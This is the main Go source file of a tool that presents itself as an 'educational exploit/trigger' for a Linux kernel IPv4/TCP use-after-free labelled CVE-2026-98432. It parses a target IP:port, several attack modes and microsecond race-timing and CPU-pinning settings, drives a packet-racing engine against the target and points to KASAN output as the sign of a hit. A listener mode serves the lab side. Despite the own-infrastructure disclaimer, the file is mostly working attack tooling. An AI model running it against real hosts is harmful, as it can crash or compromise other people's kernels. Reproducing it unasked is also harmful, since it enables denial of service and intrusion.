// cve2026-98432-exp — educational exploit/trigger for CVE-2026-98432
// (Linux kernel IPv4/TCP use-after-free, "ipv4: free inet_opt and
// ireq_opt after an RCU grace period").
//
// Educational program: test the resilience of YOUR OWN
// infrastructure. See README.md and DISCLAIMER.md.
package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"cve98432/internal/config"
	"cve98432/internal/listen"
	"cve98432/internal/race"
	"cve98432/internal/tui"
)

var version = "0.3.0"

func main() {
	var (
		cfgPath  = flag.String("config", "", "TOML config file with attack parameters")
		dryRun   = flag.Bool("dry-run", false, "print the exact packets, send nothing")
		cli      = flag.Bool("cli", false, "non-interactive mode (logs to stdout)")
		lang     = flag.String("lang", "", "ui language: ru|en (overrides config)")
		target   = flag.String("target", "", "target IP:port (overrides config)")
		mode     = flag.String("mode", "", "hammer|spray|mptcp|handshake (overrides config)")
		duration = flag.Int("duration", 0, "run duration in seconds (overrides config)")
		flows    = flag.Int("flows", 0, "parallel flows (overrides config)")
		deltaUs  = flag.Int("delta-us", 0, "SYN->retransmit delay in microseconds (overrides config)")
		srcIP    = flag.String("src-ip", "", "source IP to bind (overrides config)")
		// Handshake-mode (fire #2) tuning.
		deltaAckUs      = flag.Int("delta-ack-us", 0, "handshake: ACK->retransmit delay in microseconds")
		rstGapUs        = flag.Int("rst-gap-us", 0, "handshake: retransmit->RST delay in microseconds (negative = RST lands BEFORE the retransmit; calibrated hit window ~0..60, sweep with -gap-sweep)")
		observeUs       = flag.Int("observe-us", 0, "handshake: post-dispatch observation window in microseconds (0 = keep config value; 0 in config = no observation; the KASAN hit is kernel-side, the window only bounds rounds with no response)")
		cpus            = flag.String("cpus", "", "handshake: pin send threads, 'rtx,ack' or 'rtx,ack,rst' (e.g. 1,2 or 1,2,3; empty = unpinned; the 3rd = dedicated closing-RST CPU, pin it to an idle vCPU)")
		sweep           = flag.String("sweep", "", "handshake: per-round delta sweep, e.g. '10,12,14,16,18,20,22,24,26,28,30'")
		gapSweep        = flag.String("gap-sweep", "", "handshake: per-round RST-gap sweep, e.g. '-20,-10,0,10,20' (negative = RST before the retransmit)")
		listenAddr      = flag.String("listen", "", "listener-only mode: 'PORT' or 'IP:PORT' (accept+hold, for lab target side)")
		eventsLog       = flag.String("events-log", "", "listener: log per-event accept(A)/reset(R) timestamps (ns, remote port) to FILE for lab timing calibration")
		listenImmediate = flag.Bool("listen-immediate", false, "listener: abort-close each accepted child with SO_LINGER{1,0} (kfree(inet_opt) a few µs after accept — Option B)")
		listenBusyPoll  = flag.Bool("listen-busy-poll", false, "listener: busy-poll accept4() in a locked thread (no netpoll latency on the accept path)")
		listenCPU       = flag.Int("listen-cpu", -1, "listener: pin the busy-poll accept thread to this vCPU (-1 = unpinned)")
		listenBacklog   = flag.Int("listen-backlog", 4096, "listener: accept-queue backlog (the listen(2) argument; small values cap the queue, fire #16/#16b)")
		listenNoAccept  = flag.Bool("listen-no-accept", false, "listener: run NO accept loop: completed children stay in the accept queue (a client RST leaves them queued in TCP_CLOSE on 6.1.189); the queue is drained on shutdown (fire #16b)")
		showVer         = flag.Bool("version", false, "print version and exit")
	)
	flag.Parse()

	// Track which flags were set explicitly so that unset flags do
	// not clobber TOML values (dry_run/cli live in [general]).
	explicit := map[string]bool{}
	flag.Visit(func(f *flag.Flag) { explicit[f.Name] = true })

	if *showVer {
		fmt.Println("cve2026-98432-exp", version)
		return
	}

	// Listener-only mode: the tool acts as the lab's target-side
	// endpoint (accept + hold until the kernel resets the child).
	if *listenAddr != "" {
		if *listenNoAccept && (*listenImmediate || *listenBusyPoll) {
			fatalf("--listen-no-accept conflicts with --listen-immediate/--listen-busy-poll (no accept loop at all)")
		}
		runListener(*listenAddr, *eventsLog, *listenBacklog, listen.Options{
			Immediate: *listenImmediate,
			BusyPoll:  *listenBusyPoll,
			PinCPU:    *listenCPU,
			NoAccept:  *listenNoAccept,
		})
		return
	}

	cfg, err := config.Load(*cfgPath)
	if err != nil {
		fatalf("config: %v", err)
	}
	applyOverrides(&cfg, explicit, *target, *mode, *duration, *flows, *deltaUs, *srcIP, *lang,
		*deltaAckUs, *rstGapUs, *observeUs, *cpus, *sweep, *gapSweep)
	// Apply only explicitly-set flags so TOML dry_run/cli survive.
	if explicit["dry-run"] {
		cfg.General.DryRun = *dryRun
	}
	if explicit["cli"] {
		cfg.General.CLI = *cli
	}

	if cfg.General.DryRun {
		text, err := race.DryRunText(cfg)
		if err != nil {
			fatalf("dry-run: %v", err)
		}
		fmt.Println(text)
		return
	}

	if cfg.General.CLI || !isTTY() {
		runHeadless(cfg)
		return
	}
	if err := tui.Run(&cfg, cfg.General.DryRun); err != nil {
		fatalf("tui: %v", err)
	}
}

func applyOverrides(cfg *config.Config, explicit map[string]bool,
	target, mode string, duration, flows, deltaUs int, srcIP, lang string,
	deltaAckUs, rstGapUs, observeUs int, cpus, sweep, gapSweep string) {
	if target != "" {
		ip, port, ok := strings.Cut(target, ":")
		if !ok {
			fatalf("bad -target %q (want ip:port)", target)
		}
		cfg.Target.IP = ip
		p, err := strconv.Atoi(port)
		if err != nil {
			fatalf("bad port in -target %q (want ip:port)", target)
		}
		cfg.Target.Port = p
	}
	if mode != "" {
		cfg.Target.Mode = config.Mode(mode)
	}
	if duration > 0 {
		cfg.Timing.DurationSec = duration
	}
	if flows > 0 {
		cfg.Timing.Flows = flows
	}
	if deltaUs > 0 {
		cfg.Timing.DeltaUs = deltaUs
	}
	if srcIP != "" {
		cfg.Payload.SourceIP = srcIP
	}
	if lang != "" {
		cfg.General.Lang = lang
	}
	// 0 is a valid TOML value here, so honor the flag only when it
	// was set explicitly.
	if explicit["delta-ack-us"] {
		cfg.Handshake.DeltaAckUs = deltaAckUs
	}
	if explicit["rst-gap-us"] {
		cfg.Handshake.RstGapUs = rstGapUs
	}
	if explicit["observe-us"] {
		cfg.Handshake.ObserveUs = observeUs
	}
	if cpus != "" {
		parts := strings.Split(cpus, ",")
		if len(parts) != 2 && len(parts) != 3 {
			fatalf("bad -cpus %q (want 'rtx,ack' or 'rtx,ack,rst', e.g. 1,2,3)", cpus)
		}
		rtx, err1 := strconv.Atoi(strings.TrimSpace(parts[0]))
		ack, err2 := strconv.Atoi(strings.TrimSpace(parts[1]))
		rst := 0
		if len(parts) == 3 {
			rst, err2 = strconv.Atoi(strings.TrimSpace(parts[2]))
		}
		if err1 != nil || err2 != nil || rtx < 0 || ack < 0 || rst < 0 {
			fatalf("bad -cpus %q (want 'rtx,ack' or 'rtx,ack,rst', e.g. 1,2,3)", cpus)
		}
		cfg.Handshake.CPURtx = rtx
		cfg.Handshake.CPUAck = ack
		cfg.Handshake.CPURst = rst
	}
	if vals := parseSweepList("-sweep", sweep); vals != nil {
		cfg.Handshake.DeltaSweepUs = vals
	}
	if vals := parseSweepList("-gap-sweep", gapSweep); vals != nil {
		cfg.Handshake.GapSweepUs = vals
	}
}

// parseSweepList turns "a,b,c" into []int (empty/nil input yields nil).
func parseSweepList(name, s string) []int {
	if s == "" {
		return nil
	}
	var vals []int
	for _, p := range strings.Split(s, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		v, err := strconv.Atoi(p)
		if err != nil {
			fatalf("bad %s value %q in %q", name, p, s)
		}
		vals = append(vals, v)
	}
	if len(vals) == 0 {
		fatalf("bad %s %q (no numbers)", name, s)
	}
	return vals
}

// runListener runs the tool as the target-side endpoint: accept and
// hold connections until the kernel closes them (our RST). The
// reporter line lands on stdout every 5 seconds; the final counters
// are printed on exit.
func runListener(addr, eventsLog string, backlog int, opts listen.Options) {
	var evw io.Writer
	var evf *os.File
	if eventsLog != "" {
		f, err := os.Create(eventsLog)
		if err != nil {
			fatalf("events-log: %v", err)
		}
		evf = f
		evw = f
	}
	srv, err := listen.Start(addr, backlog, os.Stdout, evw, opts)
	if err != nil {
		fatalf("listener: %v", err)
	}
	if evw != nil {
		fmt.Printf("[listener] events log: %s\n", eventsLog)
	}
	mode := "accepting and holding connections (RST from the tool releases them)"
	if opts.Immediate {
		mode = "accepting and immediately abort-closing (SO_LINGER{1,0}: kfree(inet_opt) on close, Option B)"
	}
	if opts.NoAccept {
		mode = "NO accept loop: children stay in the accept queue (backlog-capped; RST leaves them queued in TCP_CLOSE on 6.1.189); queue drained on shutdown (fire #16b)"
	}
	if opts.BusyPoll {
		detail := " (busy-poll accept4"
		if opts.PinCPU >= 0 {
			detail += fmt.Sprintf(", pinned to CPU %d", opts.PinCPU)
		}
		mode += detail + ")"
	}
	fmt.Printf("[listener] %s: %s\n", srv.Addr(), mode)
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	<-ctx.Done()
	stop()
	fmt.Println("[listener] interrupted, closing")
	srv.Close()
	if evf != nil {
		evf.Close()
	}
	c := srv.Counters()
	fmt.Printf("[listener] done: accepted=%d released=%d\n", c.Accepted, c.Released)
}

// runHeadless fires the attack and streams stats to stdout until
// Ctrl-C or the configured duration.
func runHeadless(cfg config.Config) {
	if err := cfg.Validate(); err != nil {
		fatalf("validation: %v", err)
	}
	if cfg.Target.Mode == config.ModeHandshake {
		h := cfg.Handshake
		fmt.Printf("[headless] target=%s:%d mode=handshake cpus rtx=%d ack=%d delta=%dus rst-gap=%dus timeout=%dms duration=%ds\n",
			cfg.Target.IP, cfg.Target.Port, h.CPURtx, h.CPUAck,
			h.DeltaAckUs, h.RstGapUs, h.SynackTimeoutMs, cfg.Timing.DurationSec)
	} else {
		fmt.Printf("[headless] target=%s:%d mode=%s flows=%d delta=%dus duration=%ds\n",
			cfg.Target.IP, cfg.Target.Port, cfg.Target.Mode,
			cfg.Timing.Flows, cfg.Timing.DeltaUs, cfg.Timing.DurationSec)
	}

	eng := race.New(cfg)
	if err := eng.Start(); err != nil {
		fatalf("start: %v", err)
	}
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	due := time.After(time.Duration(cfg.Timing.DurationSec) * time.Second)
	for {
		select {
		case ev := <-eng.Events():
			fmt.Printf("t+%s [%s] %s\n", ev.Time.Round(time.Millisecond), ev.Level, ev.Msg)
		case st := <-eng.Snapshots():
			if cfg.Target.Mode == config.ModeHandshake {
				fmt.Printf("t+%s syn=%d rtx=%d rounds=%d skipped=%d reader=%d synack=%d rst=%d err=%d\n",
					st.Elapsed.Round(time.Millisecond), st.SynSent, st.RtxSent,
					st.HsRounds, st.HsSkipped, st.HsReader,
					st.SynAck, st.Rst, st.SendErrors)
			} else {
				fmt.Printf("t+%s syn=%d rtx=%d pps=%.0f synack=%d rst=%d err=%d\n",
					st.Elapsed.Round(time.Millisecond), st.SynSent, st.RtxSent,
					st.Pps, st.SynAck, st.Rst, st.SendErrors)
			}
		case <-ticker.C:
		case <-due:
			fmt.Println("[headless] duration elapsed, stopping")
			eng.Stop()
			printSummary(eng)
			return
		case <-ctx.Done():
			fmt.Println("[headless] interrupted, stopping")
			eng.Stop()
			printSummary(eng)
			return
		}
	}
}

// printSummary prints the final counters of the run.
func printSummary(eng *race.Engine) {
	st := eng.FinalStats()
	fmt.Printf("[headless] done: syn=%d rtx=%d total=%d send_err=%d synack=%d rst=%d other=%d\n",
		st.SynSent, st.RtxSent, st.TotalSent, st.SendErrors,
		st.SynAck, st.Rst, st.OtherReply)
	if st.HsRounds != 0 || st.HsReader != 0 {
		fmt.Printf("[headless] handshake: rounds=%d skipped=%d reader-evidence=%d rst-to-round=%d\n",
			st.HsRounds, st.HsSkipped, st.HsReader, st.HsRstTgt)
	}
	fmt.Println("[headless] check the target: dmesg | grep -i kasan")
}

func isTTY() bool {
	fi, err := os.Stdout.Stat()
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeCharDevice != 0
}

func fatalf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "cve2026-98432-exp: "+format+"\n", args...)
	os.Exit(1)
}
